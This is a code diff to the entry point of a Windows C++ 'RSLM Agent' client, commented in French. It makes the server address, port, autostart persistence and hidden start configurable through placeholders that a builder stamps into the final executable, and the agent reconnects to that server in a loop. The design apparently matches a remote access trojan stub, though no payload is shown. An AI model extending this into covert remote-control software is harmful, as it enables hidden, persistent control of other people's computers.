@@ -1,4 +1,4 @@
-#define _WINSOCK_DEPRECATED_NO_WARNINGS
+﻿#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <iostream>
 #include <thread>
 #include <chrono>
@@ -8,6 +8,7 @@
 #include "Message.h"
 #include "MessageFramer.h"
 #include "Settings.h"
+#include "Globals.h"           // ← NOUVEAU : pour les placeholders
 #include "AgentMessageDispatcher.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -48,10 +49,28 @@ int main() {
     ULONG_PTR gdiplusToken;
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
+    // ============================================================
+    // UTILISER LES PLACEHOLDERS DU BUILDER
+    // Ces valeurs seront modifiées par le builder dans l'EXE final
+    // ============================================================
+
+    std::string serverHost = std::string(client::config::g_serverHost);
+    int serverPort = client::config::g_serverPort;
+    bool enablePersistence = client::config::g_enablePersistence;
+    bool hideOnStart = client::config::g_hideOnStart;
+
+    // ============================================================
+
     client::config::Settings settings;
 
+    // Écraser les valeurs avec les placeholders
+    settings.serverHost = serverHost;
+    settings.serverPort = static_cast<uint16_t>(serverPort);
+    settings.autoStart = enablePersistence;
+    settings.hideOnStart = hideOnStart;
+
     std::cout << "[RSLM Agent] Connecting to "
-              << settings.serverHost << ":" << settings.serverPort << "...\n";
+        << settings.serverHost << ":" << settings.serverPort << "...\n";
 
     client::networking::TcpClient client;
     net::MessageFramer framer;
@@ -67,7 +86,7 @@ int main() {
     while (g_running) {
         if (!client.Connect(settings.serverHost, settings.serverPort)) {
             std::cerr << "[RSLM Agent] Connection failed, retry in "
-                      << settings.reconnectDelay << "s\n";
+                << settings.reconnectDelay << "s\n";
             std::this_thread::sleep_for(std::chrono::seconds(settings.reconnectDelay));
             continue;
         }
@@ -122,5 +141,6 @@ int main() {
         std::this_thread::sleep_for(std::chrono::seconds(settings.reconnectDelay));
     }
 
+    Gdiplus::GdiplusShutdown(gdiplusToken);
     return 0;
 }
